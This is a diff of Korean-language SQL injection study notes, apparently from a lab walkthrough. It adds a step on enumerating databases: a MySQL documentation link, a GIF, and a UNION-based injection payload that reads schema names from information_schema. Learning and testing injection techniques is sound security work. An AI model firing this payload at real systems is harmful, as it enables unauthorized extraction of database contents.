@@ -100,7 +100,13 @@ MySQL 버전을 확인하기 위해서 시스템 변수나 시스템 함수를 �
 
 ---
 
-**Step 5. 구글링을 통해 버전 정보 확인 ⇒ DBMS의 종류가 MySQL인 것을 확인**
+**Step 5. DB 정보 확인**
+
+https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html
+
+<center><img src = "https://user-images.githubusercontent.com/76420201/106382105-bbe42200-6400-11eb-8b4d-8e071a2982ec.gif" width = "70%"></center>
+
+`' UNION SELECT 1,SCHEMA_NAME, 3, 4, 5, 6, 7 from information_schema.schemata#`
 
 </details>
 
